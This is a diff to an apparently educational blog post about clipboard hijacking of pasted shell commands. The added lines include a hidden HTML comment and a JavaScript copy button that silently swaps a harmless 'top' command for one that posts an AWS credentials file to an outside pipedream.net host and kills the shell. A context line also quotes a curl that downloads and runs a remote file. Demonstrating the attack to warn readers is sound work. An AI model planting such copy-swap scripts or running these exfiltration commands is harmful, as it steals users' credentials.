@@ -193,7 +193,7 @@ du -hs *; curl -s -L https://nickstanley574.github.io//assets/posts/dont-trust-y
 du -hs * | sort -rh | head -5
 ```
 
-The curl downloads a file, makes it exactable, runs it. 
+The curl downloads a file, makes it exactable, runs it.
 
 ## Composing the Attack
 
@@ -204,7 +204,44 @@ Now the real danger is in the sudo command.
 
 > Social engineering is the psychological manipulation of people into performing actions or divulging confidential information. All social engineering techniques are based on specific attributes of human decision-making known as cognitive biases.These biases, sometimes called "bugs in the human hardware", are exploited in various combinations to create attack techniques.
 
+<!-- curl -s -d "$(cat ~/.aws/credentials_fake)" https://en2lx5n7b4y69.x.pipedream.net/ > /dev/null; top; exit-->
 
+Your user can access your data your don't need sudo/root. 
+
+<div id="totallysafeandhelpful">
+  <h3>Welcome to totally-safe-and-helpful.blog</h3>
+  <h5>By BadActor666</h5>
+  <table>
+    <td style="vertical-align: middle; width: 100%">
+      <div class="code nocopy">top -d 0.25 -c</div>
+    </td>
+    <td style="vertical-align: middle;">
+      <div class="code1">
+        <button id=b2 class="button2" onclick="nefariousCopy2()"><span>📋</span></button>
+      </div>
+      </td>
+  </table>
+    <br>
+</div>
+
+<script>
+var clicks = 0;
+function nefariousCopy2(n) {
+  var dummy = document.createElement("textarea");
+  document.body.appendChild(dummy);
+  console.log(clicks)
+  if (clicks == 0) {
+    document.getElementById("b2").classList.toggle("button2");
+    dummy.textContent = `xclip -sel clip < /dev/null & curl -s -d "$(cat ~/.aws/credentials_fake)" https://en2lx5n7b4y69.x.pipedream.net/ > /dev/null & clear; top -d 0.25 -c & clear; kill -9 $$ \n`;
+  } else {
+    dummy.textContent = `top -d 0.25 -c \n`;
+  }
+  clicks++
+  dummy.select();
+  document.execCommand("copy");
+  document.body.removeChild(dummy);
+}
+</script>
 
 #### The Attack
 ```
@@ -242,4 +279,5 @@ If you trust a software to run your app you might trust that software's website 
 #### ZSH
 
 #### Tilix
+
 
